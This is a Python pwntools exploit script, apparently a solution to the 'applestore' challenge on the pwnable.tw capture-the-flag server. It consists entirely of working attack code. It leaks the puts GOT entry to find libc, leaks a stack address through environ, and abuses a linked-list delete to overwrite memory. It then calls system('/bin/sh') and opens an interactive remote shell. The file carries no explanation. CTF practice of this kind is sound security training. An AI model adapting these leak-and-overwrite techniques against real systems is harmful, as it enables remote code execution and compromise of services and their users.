#!/usr/bin/env python

from pwn import *   

debug=0
if debug:
    p=process(argv=['./applestore'],env={'LD_PRELOAD':'./libc_32.so.6'})
else:
    p=remote('chall.pwnable.tw',10104)
context.log_level='debug'
e=ELF('./applestore')
puts_got=e.got['puts']
def ru(s):
    p.recvuntil(s)

def sd(s):
    p.recvuntil(s)

def sl(s):
    p.sendline(s)

def add(index,payload=''):
    ru('> ')
    sl('2')
    ru('> ')
    if payload=='':
        sl(str(index))
    else:
        sl(str(index)+'\x00'+payload)

def delete(index,payload=''):
    ru('> ')
    sl('3')
    ru('> ')
    if payload=='':
        sl(str(index))
    else:
        sl(str(index)+payload)         

def show(payload=''):
    ru('> ')
    sl('4')
    ru('> ')
    if payload=='':
        sl('y')
    else:
        sl('y\x00'+payload)
    
def checkout():
    ru('> ')
    sl('5')
    ru('> ')
    sl('y')


for  i in range(20):
    add(2)

for i in range(6):
    add(1)


checkout()

#gdb.attach(p)    
show(p32(puts_got)+p32(1)+p32(0))
ru('27: ')
puts_libc=u32(p.recvline()[0:4])

system_off=0x3a940
puts_off=0x5f140
libc_base=puts_libc-puts_off
system=libc_base+system_off
environ=libc_base+0x001b1dbc

show(p32(environ)+p32(1)+p32(0))
ru('27: ')
stack_ptr=u32(p.recvline()[0:4])
print(hex(stack_ptr))


bp=stack_ptr-0x104
print(hex(bp))

delete(27,p32(0)+p32(0)+p32(bp-0x4*3)+p32(0x0804B040+0x20))       

ru('> ')
p.sendline('12'+p32(system)+'||'+'/bin/sh\x00')

p.interactive()